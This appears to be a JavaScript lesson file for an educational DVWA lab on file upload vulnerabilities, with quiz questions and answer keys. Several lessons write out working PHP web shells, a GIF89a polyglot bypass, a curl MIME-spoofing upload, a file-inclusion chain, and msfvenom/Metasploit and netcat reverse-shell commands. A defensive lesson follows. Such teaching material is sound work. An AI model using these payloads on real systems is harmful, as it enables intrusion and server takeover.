const LESSONS = [
  {
    title: "1. Start Here — Set Up the Lab",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL: Get both machines running and log into DVWA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️  This lab is for EDUCATION ONLY. Only attack the DVWA lab machine inside this page. Never use these techniques on real websites.

━━━━━ STEP 1 — Launch DVWA (Your Target) ━━━━━
👆 Look at the red box above that says "🎯 DVWA Target Server"
   Click the button: [Open DVWA Target ⇗]
   → A new browser tab will open with DVWA running.
   → If it says "Cannot connect" wait 10 seconds and refresh.

━━━━━ STEP 2 — Set Up the DVWA Database ━━━━━
In the DVWA tab that just opened:
   1. Look at the left sidebar menu
   2. Click → "Setup / Reset DB"
   3. Scroll down and click the big button: [Create / Reset Database]
   4. Wait for the green success message
   5. DVWA will reload — that is normal!

━━━━━ STEP 3 — Log Into DVWA ━━━━━
After the page reloads you will see a login screen:
   Username: admin
   Password: password
   → Click [Login]

━━━━━ STEP 4 — Set Security Level to LOW ━━━━━
This is very important — do this BEFORE anything else!
   1. In the left sidebar click → "DVWA Security"
   2. You will see a dropdown. Change it from "Impossible" to → "Low"
   3. Click [Submit]
   4. The page will say "Security level set to low" ✅

━━━━━ STEP 5 — Launch Kali (Your Attack Machine) ━━━━━
👆 Look at the red box above that says "🐉 Kali Linux Environment"
   Click the button: [Start Kali Container ⇗]
   → Wait about 15 seconds
   → A command will appear in a black box below the button
   → Copy that command and paste it in YOUR computer's terminal (not DVWA)
   → That gives you a Kali Linux command line!

━━━━━ ✅ YOU ARE READY! ━━━━━
Both machines are now running:
  • DVWA tab = the website you will attack
  • Kali terminal = your attack machine`,
    questions: [
      { q: "What username do you use to log into DVWA?", a: "admin" },
      { q: "What security level must DVWA be set to for Lesson 4 (basic upload)?", a: "low" },
      { q: "After clicking 'Create / Reset Database', what should you see?", a: "success" }
    ]
  },
  {
    title: "2. What is a File Upload Vulnerability?",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 CONCEPT: Understanding the Attack
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Imagine this: A website says "Upload your profile picture here 📷"
Most people upload a harmless image like photo.jpg.

BUT — what if you upload a PHP file instead?
If the website saves it and lets you visit it via a URL,
your PHP code RUNS on the server.

That is a File Upload Vulnerability.

━━━━━ WHY IS THIS BAD? ━━━━━
When an attacker's code runs on a server it is called:
   Remote Code Execution (RCE)

With RCE an attacker can:
   • Read every file on the server (databases, passwords)
   • Delete files
   • Install a permanent backdoor
   • Take full control of the server

━━━━━ KEY WORDS (remember these!) ━━━━━

Web Shell
   A PHP file you upload that lets you type commands.
   Example: visit shell.php?cmd=whoami → server runs whoami for you.

Upload Directory
   The folder where uploaded files are saved on the server.
   In DVWA it is: /var/www/html/dvwa/hackable/uploads/
   Files here are reachable via URL, so PHP inside them can execute.

Webroot
   The base folder the web server serves to the internet.
   Anything inside the webroot can be visited via a URL.

━━━━━ THE SIMPLE ATTACK FLOW ━━━━━
   1. Attacker creates a PHP file (web shell)
   2. Attacker uploads it through the upload form
   3. Server saves it in the uploads folder (inside webroot)
   4. Attacker visits the URL of the uploaded file
   5. PHP executes → attacker runs commands on the server! 💀`,
    questions: [
      { q: "What is it called when an attacker runs code on a remote server?", a: "Remote Code Execution" },
      { q: "What do we call a PHP script uploaded to run OS commands via a URL?", a: "web shell" },
      { q: "In DVWA, what is the name of the folder where uploaded files are stored?", a: "hackable/uploads" }
    ]
  },
  {
    title: "3. Linux Commands You Will Use",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️  LEARN: Linux commands for the attack
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Once your PHP shell is uploaded, you send commands through it via a URL.
Here are the commands you will use and what they do:

━━━━━ COMMAND: whoami ━━━━━
   What it does: Shows which user the web server is running as
   URL to use:   shell.php?cmd=whoami
   Expected output: www-data
   (www-data is a low-privilege Linux user Apache runs as)

━━━━━ COMMAND: id ━━━━━
   What it does: Shows user ID, group ID, and all groups
   URL to use:   shell.php?cmd=id
   Expected output: uid=33(www-data) gid=33(www-data)

━━━━━ COMMAND: ls ━━━━━
   What it does: Lists all files in the current folder
   URL to use:   shell.php?cmd=ls
   Or list a specific folder: shell.php?cmd=ls+/var/www/html

━━━━━ COMMAND: pwd ━━━━━
   What it does: Shows which folder you are currently in
   URL to use:   shell.php?cmd=pwd
   Expected output: /var/www/html/dvwa/hackable/uploads

━━━━━ COMMAND: cat ━━━━━
   What it does: Reads and prints the contents of a file
   URL to use:   shell.php?cmd=cat+/etc/passwd
   This reads the password file on the server!

━━━━━ HOW TO RUN COMMANDS ━━━━━
In the URL bar, replace the IP and type your command after ?cmd=
   http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=COMMAND_HERE

Use + instead of spaces in the URL:
   ?cmd=ls+/var/www     means: ls /var/www`,
    questions: [
      { q: "Which command shows what OS user the web server is running as?", a: "whoami" },
      { q: "Which command lists files in the current directory?", a: "ls" },
      { q: "In a URL, what character replaces a space in the cmd parameter?", a: "+" }
    ]
  },
  {
    title: "4. DVWA Low — Upload Your First Shell",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔴 PRACTICAL ATTACK — DVWA Security: LOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

On Low security DVWA accepts ANY file with no checks at all.
This is the most basic real-world misconfiguration.

━━━━━ STEP 1 — Create the Web Shell File ━━━━━
In your Kali terminal, type this exactly:

   cat > shell.php << 'EOF'
   <?php
   if(isset($_REQUEST['cmd'])){
     echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   }
   ?>
   EOF

   ✅ This creates a file called shell.php in your current folder.

What each line does:
   isset($_REQUEST['cmd'])     → Is there a ?cmd= in the URL?
   shell_exec($_REQUEST['cmd']) → Run that value as a Linux command
   echo "<pre>...</pre>"       → Print the command output to the browser

━━━━━ STEP 2 — Navigate to File Upload in DVWA ━━━━━
In the DVWA browser tab:
   → Left sidebar → click "File Upload"
   → You will see a simple "Choose File" button and an "Upload" button

━━━━━ STEP 3 — Upload the Shell ━━━━━
   1. Click [Choose File]
   2. Navigate to where shell.php is (your home folder in Kali, or Desktop)
   3. Select shell.php and click Open
   4. Click [Upload]
   5. You will see a SUCCESS message:
      "../../hackable/uploads/shell.php succesfully uploaded!"

━━━━━ STEP 4 — Execute Commands! ━━━━━
Now visit this URL (replace [DVWA-IP] with your DVWA address):
   http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=whoami

   Expected output on the page: www-data

Try more commands:
   ...shell.php?cmd=id
   ...shell.php?cmd=ls
   ...shell.php?cmd=pwd
   ...shell.php?cmd=cat+/etc/passwd

━━━━━ 🎉 YOU HAVE RCE! ━━━━━
You are now running Linux commands on a remote server through a web browser!`,
    questions: [
      { q: "What PHP function runs an OS command and returns its output?", a: "shell_exec" },
      { q: "After uploading shell.php on Low, which folder is it saved in?", a: "hackable/uploads" },
      { q: "What URL parameter sends commands to the web shell?", a: "cmd" }
    ]
  },
  {
    title: "5. How Servers Check Files (MIME & Magic Bytes)",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 THEORY: How does the server decide if a file is safe?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Servers use different methods to check uploaded files.
Knowing which method a server uses tells you how to bypass it.

━━━━━ METHOD 1 — Check the MIME Type Header ━━━━━
When your browser uploads a file it sends a Content-Type header.
Example: Content-Type: image/jpeg

PROBLEM: The attacker controls this header. It can be faked easily!
This is what DVWA Medium checks — and it can be bypassed.

Common MIME types:
   image/jpeg   → .jpg file
   image/png    → .png file
   image/gif    → .gif file
   text/plain   → .txt file

━━━━━ METHOD 2 — Check the File Extension ━━━━━
Server looks at the end of the filename: shell.php → extension is .php

Bypass tricks:
   • shell.php.jpg   (rename to look like image)
   • shell.phtml     (alternate PHP extension)
   • shell.php5      (alternate PHP extension)
   • shell.php%00.jpg (null byte, old PHP only)

━━━━━ METHOD 3 — Check Magic Bytes ━━━━━
Every real file format starts with specific bytes.
Example: A GIF file always starts with the letters: GIF89a

PHP function getimagesize() reads these bytes.
If the file starts with GIF89a it says "this is a GIF image ✅"

BYPASS: Start your PHP file with GIF89a before the PHP code!
getimagesize() sees the header → passes.
PHP interpreter sees the <?php code → executes it!

   GIF89a<?php system($_GET['cmd']); ?>

━━━━━ WHICH LEVEL USES WHICH CHECK? ━━━━━
   Low      → No check at all
   Medium   → Checks MIME type header (easy to fake)
   High     → Checks magic bytes with getimagesize()`,
    questions: [
      { q: "What HTTP header tells the server what type of file is being uploaded?", a: "Content-Type" },
      { q: "What 6 characters do you prepend to trick getimagesize() into thinking a file is a GIF?", a: "GIF89a" },
      { q: "What are the specific bytes at the start of a file that identify its real type called?", a: "magic bytes" }
    ]
  },
  {
    title: "6. DVWA Medium — Bypass the MIME Check",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟡 PRACTICAL ATTACK — DVWA Security: MEDIUM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Medium checks that the Content-Type header says image/jpeg or image/png.
Uploading shell.php directly will fail.
We need to FAKE (spoof) the MIME type while keeping the PHP content.

━━━━━ STEP 1 — Change DVWA to Medium ━━━━━
In the DVWA tab:
   → Left sidebar → "DVWA Security"
   → Change to "Medium"
   → Click [Submit]

━━━━━ STEP 2 — Get Your Session Cookie ━━━━━
You need your DVWA login cookie for curl to work authenticated.
In Chrome/Firefox:
   1. Press F12 to open Developer Tools
   2. Click the "Application" or "Storage" tab
   3. Click "Cookies" → click the DVWA URL
   4. Find "PHPSESSID" and copy its value (a long random string)
   It will look like: abc123def456...

━━━━━ STEP 3 — Upload with MIME Spoof using curl ━━━━━
In your Kali terminal, run this (replace SESSION_VALUE with your PHPSESSID):

   curl -v \
     -b "security=medium; PHPSESSID=SESSION_VALUE" \
     -F "uploaded=@shell.php;type=image/jpeg" \
     -F "Upload=Upload" \
     http://[DVWA-IP]/dvwa/vulnerabilities/upload/

Line by line:
   -b "security=medium; PHPSESSID=..."
      → Sends your cookies so DVWA knows you're logged in
   -F "uploaded=@shell.php;type=image/jpeg"
      → Uploads shell.php BUT lies to the server: "this is a JPEG image"
   -F "Upload=Upload"
      → Clicks the Upload button programmatically

━━━━━ STEP 4 — Check the Response ━━━━━
In the curl output look for the success message:
   "../../hackable/uploads/shell.php succesfully uploaded!"

━━━━━ STEP 5 — Execute Commands ━━━━━
Same as before — visit in your browser:
   http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=id

━━━━━ WHY IT WORKS ━━━━━
Medium checks the Content-Type header — but YOU sent that header.
The server believed your lie. The actual file content is still PHP.`,
    questions: [
      { q: "What is it called when you fake the Content-Type header to bypass file type checks?", a: "MIME spoofing" },
      { q: "In the curl command, which part sets the fake MIME type?", a: "type=image/jpeg" },
      { q: "Where do you find your PHPSESSID cookie value?", a: "developer tools" }
    ]
  },
  {
    title: "7. DVWA High — Bypass Magic Byte Check",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔴 PRACTICAL ATTACK — DVWA Security: HIGH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

High uses getimagesize() which reads the actual file bytes.
Simply faking the MIME header will NOT work here.
We must make the file look like a real GIF at the byte level.

━━━━━ STEP 1 — Change DVWA to High ━━━━━
In the DVWA tab:
   → Left sidebar → "DVWA Security"
   → Change to "High"
   → Click [Submit]

━━━━━ STEP 2 — Create a GIF89a Polyglot Payload ━━━━━
In your Kali terminal, run:

   printf 'GIF89a<?php system($_GET["cmd"]); ?>' > evil.gif

What this does:
   printf 'GIF89a'        → Writes the 6-byte GIF magic number FIRST
   <?php system(...)?>   → Appends PHP code after it
   > evil.gif             → Saves the file as evil.gif

Now getimagesize() reads the file:
   → Sees GIF89a at the start → "This is a GIF! ✅ Allow upload."
   → PHP code after the header is ignored by the image check.

━━━━━ STEP 3 — Upload evil.gif via DVWA ━━━━━
In the DVWA tab:
   → Left sidebar → "File Upload"
   → Click [Choose File] → select evil.gif → click [Upload]
   → You should see the success message! ✅

But wait — High also blocks .php extensions!
The file is saved as evil.gif, not evil.php.
Apache will NOT auto-execute a .gif file.

━━━━━ STEP 4 — Execute via File Inclusion (LFI Chain!) ━━━━━
DVWA has ANOTHER vulnerability: File Inclusion.
We use it to include and execute our uploaded .gif as PHP!

In the DVWA tab:
   → Left sidebar → "File Inclusion"
   → Look at the URL — it has: ?page=include.php
   → Change "include.php" to the path of your uploaded file.

⚠️ IMPORTANT: On DVWA High, the File Inclusion page restricts
the page parameter to only accept paths starting with "file".
Use the file:// protocol wrapper to bypass this:

   http://[DVWA-IP]/dvwa/vulnerabilities/fi/?page=file:///var/www/html/dvwa/hackable/uploads/evil.gif&cmd=id

If DVWA security is set to Low or Medium for File Inclusion, the
simpler relative path also works:
   ?page=../../hackable/uploads/evil.gif&cmd=id

What happens:
   PHP includes evil.gif → sees the PHP code inside → executes it!
   The &cmd=id is passed to system() → returns: uid=33(www-data) 🎉

━━━━━ WHY IT WORKS ━━━━━
getimagesize() only checks the first few bytes (GIF89a).
PHP's include() executes ALL PHP tags it finds in any file.
We combined TWO vulnerabilities: File Upload + File Inclusion.`,
    questions: [
      { q: "Which PHP function reads file header bytes to validate if it is a real image?", a: "getimagesize" },
      { q: "What 6-character magic bytes do we put at the start of the file to bypass the image check?", a: "GIF89a" },
      { q: "Which second DVWA vulnerability do we use to execute the uploaded .gif as PHP?", a: "File Inclusion" }
    ]
  },
  {
    title: "8. Tool Method — Metasploit Reverse Shell",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛠️  TOOLS: Automate the attack with Metasploit
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

So far we used manual methods. Now let's use Metasploit to get a
full interactive shell — not just single commands.

━━━━━ WHAT IS A REVERSE SHELL? ━━━━━
Instead of you connecting TO the server,
the server connects BACK to your Kali machine.
This bypasses firewalls that block incoming connections.

Flow:
   1. You start a listener on Kali (wait for connections)
   2. Victim server connects back to you
   3. You have a full interactive command line!

━━━━━ STEP 1 — Find Your Kali IP ━━━━━
In your Kali terminal:
   ip addr show eth0 | grep inet

Note the IP address (e.g. 172.17.0.3)
This is YOUR_KALI_IP for the next steps.

━━━━━ STEP 2 — Generate a PHP Reverse Shell ━━━━━
In Kali terminal:
   msfvenom -p php/meterpreter/reverse_tcp \
     LHOST=YOUR_KALI_IP \
     LPORT=4444 \
     -f raw \
     -o payload.php

   -p php/meterpreter/reverse_tcp  → PHP that calls back to us
   LHOST=YOUR_KALI_IP              → Replace with YOUR actual IP!
   LPORT=4444                      → Port we'll listen on
   -o payload.php                  → Save as payload.php

━━━━━ STEP 3 — Start the Metasploit Listener ━━━━━
Open a second terminal window. In Kali run:
   msfconsole -q

Wait for the msf6 > prompt, then type:
   use exploit/multi/handler
   set PAYLOAD php/meterpreter/reverse_tcp
   set LHOST YOUR_KALI_IP
   set LPORT 4444
   exploit

The listener is now waiting for connections.

━━━━━ STEP 4 — Upload and Trigger ━━━━━
Set DVWA back to Low security.
Upload payload.php via File Upload (same as Lesson 4).
Then in a browser visit:
   http://[DVWA-IP]/dvwa/hackable/uploads/payload.php

━━━━━ STEP 5 — Catch the Shell ━━━━━
In your Metasploit terminal you will see:
   [*] Meterpreter session 1 opened

Now type:
   sysinfo      → See server info
   getuid       → See your user (www-data)
   shell        → Drop into a real bash shell
   whoami       → www-data`,
    questions: [
      { q: "What msfvenom flag sets the attacker's listening IP address?", a: "LHOST" },
      { q: "What Metasploit module listens for and handles incoming reverse shell connections?", a: "exploit/multi/handler" },
      { q: "What Meterpreter command drops you into a real system bash shell?", a: "shell" }
    ]
  },
  {
    title: "9. Defenses — How to Stop These Attacks",
    points: 15,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️  DEFENSE: How developers should fix file upload
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Now you know how to attack. A good security person also knows
how to defend. Here are the real fixes developers should use:

━━━━━ DEFENSE 1 — Whitelist Extensions (not blacklist) ━━━━━
WRONG WAY (blacklist — easily bypassed):
   if ($ext == "php") { block; }    // Misses .phtml .php5 .phar!

RIGHT WAY (whitelist — only allow known safe types):
   $allowed = ['jpg', 'jpeg', 'png', 'gif'];
   if (!in_array($ext, $allowed)) { die("Not allowed!"); }

━━━━━ DEFENSE 2 — Check Real MIME Type with finfo ━━━━━
Don't trust the browser's Content-Type header — read the file itself:

   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);
   if (!in_array($mime, ['image/jpeg','image/png'])) { die(); }

finfo reads magic bytes from the actual file — cannot be faked by header.

━━━━━ DEFENSE 3 — Rename Files Randomly ━━━━━
Even if a bad file is uploaded, make the URL unpredictable:
   $new_name = bin2hex(random_bytes(16)) . '.jpg';
Attacker cannot guess the URL to trigger the shell.

━━━━━ DEFENSE 4 — Store Files OUTSIDE the Webroot ━━━━━
The webroot is the folder Apache serves to the internet.
Store uploads somewhere Apache does NOT serve:
   /var/uploads/  instead of  /var/www/html/uploads/
Even if shell.php is uploaded, there is no URL to reach it!

━━━━━ DEFENSE 5 — Disable PHP in the Upload Directory ━━━━━
Create a file named .htaccess inside the uploads folder:
   php_flag engine off

This tells Apache: "Never execute PHP files in this folder."
Even if a .php file gets in, it cannot run.

━━━━━ DEFENSE 6 — Scan with Antivirus ━━━━━
Run ClamAV or similar on uploaded files to detect known malware.

━━━━━ WHICH DEFENSE IS STRONGEST? ━━━━━
Storing files outside the webroot is the most powerful.
Even a fully working web shell cannot execute without a URL.`,
    questions: [
      { q: "Which PHP function reads actual file bytes to verify the real MIME type?", a: "finfo_file" },
      { q: "What Apache directive in .htaccess stops PHP execution in a directory?", a: "php_flag engine off" },
      { q: "Why is storing uploads OUTSIDE the webroot the strongest defense?", a: "the file cannot be accessed via URL" }
    ]
  },
  {
    title: "10. Final Quiz — Prove You Know It!",
    points: 15,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏆 FINAL QUIZ — Answer all questions to complete the lab!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Quick recap before the quiz:

ATTACK FLOW:
   1. Create shell.php (PHP that runs ?cmd= as OS command)
   2. Upload it to DVWA via File Upload page
   3. Visit the uploaded file URL with ?cmd=whoami
   4. Run any command through the browser!

BYPASS METHODS:
   Low    → Direct upload works (no checks)
   Medium → Spoof Content-Type with: type=image/jpeg in curl
   High   → Prepend GIF89a magic bytes, execute via File Inclusion

TOOLS:
   curl       → Upload with spoofed MIME type from terminal
   msfvenom   → Generate reverse shell payloads
   Metasploit → Catch incoming reverse shells
   nc -lvkp 4444 → Simple netcat listener for reverse shells
   nmap       → Discover target IPs and open ports

DEFENSES (the right way):
   ✅ Whitelist extensions (only jpg, png, gif)
   ✅ Validate MIME with finfo_file() (reads actual bytes)
   ✅ Rename uploads to random filenames
   ✅ Store files outside the webroot
   ✅ Add .htaccess with php_flag engine off
   ✅ Scan with antivirus

IMPORTANT COMMANDS TO REMEMBER:
   printf 'GIF89a<?php system($_GET["cmd"]); ?>' > evil.gif
   curl -F 'uploaded=@shell.php;type=image/jpeg' -F 'Upload=Upload' ...
   nc -lvkp 4444
   msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o pay.php

Now answer the questions below to complete the lab! 🎯`,
    questions: [
      { q: "What is the one-word term for running attacker-controlled code on a remote server?", a: "RCE" },
      { q: "What 6-character string bypasses getimagesize() on DVWA High?", a: "GIF89a" },
      { q: "What command starts a simple netcat listener on port 4444?", a: "nc -lvkp 4444" },
      { q: "What is the technique of using both File Upload AND File Inclusion together called?", a: "LFI upload chain" },
      { q: "Which curl flag sets the MIME type of the uploaded file (e.g. to image/jpeg)?", a: "type" }
    ]
  }
];
